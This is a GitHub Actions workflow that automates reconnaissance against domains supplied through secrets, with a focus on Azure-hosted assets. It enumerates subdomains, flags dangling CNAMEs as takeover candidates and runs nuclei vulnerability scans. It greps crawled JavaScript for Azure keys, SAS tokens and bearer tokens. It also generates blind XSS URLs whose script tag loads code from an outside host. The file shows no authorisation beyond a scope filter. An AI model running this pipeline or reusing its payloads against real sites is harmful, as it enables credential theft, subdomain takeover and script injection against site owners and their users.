name: Azure Recon

on:
  push:
    branches:
      - master
  workflow_dispatch:

jobs:
  enum:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v3

      - name: Setup Go
        uses: actions/setup-go@v5
        with:
          go-version: '1.22.x'

      - name: Install Tooling
        run: |
          set -euo pipefail
          sudo apt-get update
          sudo apt-get install -y wget unzip jq git curl dnsutils python3 python3-pip python3-venv
      
          echo "$HOME/go/bin" >> $GITHUB_PATH

          # Go tools
          go install github.com/tomnomnom/assetfinder@latest
          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
          go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
          go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
          go install github.com/jaeles-project/gospider@latest
      
          # Python tools
          python3 -m pip install --upgrade pip

          # Update templates
          nuclei -update-templates || true

      - name: Run Enumeration + Azure Checks + Payload Seeding
        env:
          DOMAINS: ${{ secrets.DOMAIN }}
          BXHR: ${{ secrets.BXHR }}
        run: |
          set -euo pipefail
          : "${DOMAINS:?❌ DOMAINS secret not set}"

          mkdir -p results

          echo "$DOMAINS" | tr -d '\r' | tr ',;' '\n' \
            | sed -E 's#https?://##gi' | cut -d'/' -f1 | sed '/^$/d' \
            | sort -u > /tmp/domains.txt

          echo "[*] Domains:"; cat /tmp/domains.txt

          while IFS= read -r TARGET; do
            [ -z "$TARGET" ] && continue
            echo "===== $TARGET ====="
            mkdir -p "results/$TARGET"

            # Subdomain enumeration
            subfinder -silent -d "$TARGET" > "results/$TARGET/subdomains.txt" || true
            if [ ! -s "results/$TARGET/subdomains.txt" ]; then
              assetfinder --subs-only "$TARGET" | sort -u > "results/$TARGET/subdomains.txt"
            fi

            sort -u "results/$TARGET/subdomains.txt" -o "results/$TARGET/subdomains.txt"
            grep -viE "(^|\.)((nonprod|dev|staging|sandbox|test)[.-])" \
              "results/$TARGET/subdomains.txt" > "results/$TARGET/subs_scoped.txt" || true

            # Live check
            dnsx -silent -a -resp -l "results/$TARGET/subs_scoped.txt" > "results/$TARGET/live.txt" || true

            # Dangling CNAME check (NXDOMAIN aware)
            : > "results/$TARGET/dangling-cname.txt"
            while IFS= read -r sub; do
              cname=$(dig +short CNAME "$sub" | sed 's/\.$//' | head -n1)
              if [ -n "$cname" ]; then
                if ! dig +short "$cname" | grep -q .; then
                  echo "$sub -> $cname [🔥 Dangling]" >> "results/$TARGET/dangling-cname.txt"
                fi
              fi
            done < "results/$TARGET/subs_scoped.txt"

            # Azure asset detection (case-insensitive)
            grep -Eio "(?i)([a-z0-9.-]+)\.(azurewebsites\.net|azure-api\.net|trafficmanager\.net|blob\.core\.windows\.net|file\.core\.windows\.net|database\.windows\.net)" \
              "results/$TARGET/live.txt" | sort -u > "results/$TARGET/azure_assets.txt" || true

            if [ -s "results/$TARGET/azure_assets.txt" ]; then
              nuclei -l "results/$TARGET/azure_assets.txt" \
                -severity low,medium,high,critical \
                -tags cors,ssrf,exposure,azure \
                -rate-limit 75 -c 50 -timeout 10 \
                -o "results/$TARGET/nuclei_azure.txt" || true
            fi

            # JS crawling + key leaks
            if [ -s "results/$TARGET/live.txt" ]; then
              mkdir -p "results/$TARGET/spider"
              gospider -S "results/$TARGET/live.txt" --js -o "results/$TARGET/spider" || true
              grep -RIE "(AZURE|STORAGE|SAS|SharedAccessSignature|AccountKey|DefaultEndpointsProtocol|AccountName|BlobEndpoint|QueueEndpoint|FileEndpoint|TableEndpoint|InstrumentationKey|SubscriptionKey|x-azure|Bearer\s+[A-Za-z0-9\-_.=]+)" \
                "results/$TARGET/spider" > "results/$TARGET/key_leaks.txt" || true
            fi

            # Blind payload seeding
            if [ -n "${BXHR:-}" ] && [ -s "results/$TARGET/live.txt" ]; then
              : > "results/$TARGET/blind_seeds.txt"
              while IFS= read -r base; do
                enc=$(python3 -c "import urllib.parse as u; print(u.quote(f'<script src=\"{u.quote_plus(\"${BXHR}\")}\"></script>'))")
                echo "$base?x=${enc}" >> "results/$TARGET/blind_seeds.txt"
              done < "results/$TARGET/live.txt"
            fi

          done < /tmp/domains.txt

      - name: Git & Push results + Alert
        if: always()
        env:
          EMAIL_ADDRESS: ${{ secrets.EMAIL_ADDRESS }}
          USER_NAME: ${{ secrets.USER_NAME }}
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
        run: |
          set -e
          git config --global user.email "${EMAIL_ADDRESS}"
          git config --global user.name "${USER_NAME}"
          git add results/ || true
          git commit -m "scans+chains: $(date -u)" --no-verify || echo "No changes"
          git remote set-url origin https://x-access-token:${GITHUB_TOKEN}@github.com/${{ github.repository }}
          git push origin HEAD:${GITHUB_REF##*/} || true

          STATUS="✅ Success"
          if [ "${{ job.status }}" != "success" ]; then
            STATUS="❌ Failed"
          fi

          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
            -d chat_id="${TELEGRAM_CHAT_ID}" \
            -d text="${STATUS} - Azure Recon scan for ${{ github.repository }} completed."
